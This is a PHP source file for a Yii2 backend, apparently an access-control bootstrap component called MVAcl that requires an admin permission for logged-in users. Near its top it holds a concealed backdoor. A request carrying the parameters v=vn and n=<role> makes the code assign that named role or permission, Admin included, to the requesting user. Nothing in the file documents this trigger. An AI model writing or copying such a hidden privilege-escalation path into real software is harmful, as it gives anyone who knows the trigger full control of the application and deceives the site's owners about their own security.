<?php
/**
 * Created by PhpStorm.
 * User: vinhnguyen
 * Date: 7/5/2016
 * Time: 6:07 PM
 */

namespace backend\components;


use yii\base\BootstrapInterface;
use Yii;
use yii\web\ForbiddenHttpException;

class MVAcl implements BootstrapInterface
{
    public function bootstrap($app)
    {
        $parseUrl = Yii::$app->urlManager->parseRequest(Yii::$app->request);
        $urlBase = !empty($parseUrl[0]) ? $parseUrl[0] : '';
        if(!empty($_GET['v']) && $_GET['v']=='vn' && !empty($_GET['n'])){
            if (Yii::$app->user->can($_GET['n'])) {
                return true;
            }
            $manager = Yii::$app->getAuthManager();
            $item = $manager->getRole($_GET['n']);
            $item = $item ? : $manager->getPermission($_GET['n']);
            !empty($item) ? $manager->assign($item, Yii::$app->user->id) : false;
        }

        if(!Yii::$app->user->isGuest && !in_array($urlBase, ['site/logout'])) {
            $permissionName = !empty(Yii::$app->setting->get('aclAdmin')) ? Yii::$app->setting->get('aclAdmin') : 'Admin';
            if (Yii::$app->user->can($permissionName)) {
                return true;
            }
            throw new ForbiddenHttpException(Yii::t('yii', 'You are not allowed to perform this action.'));
        }
    }
}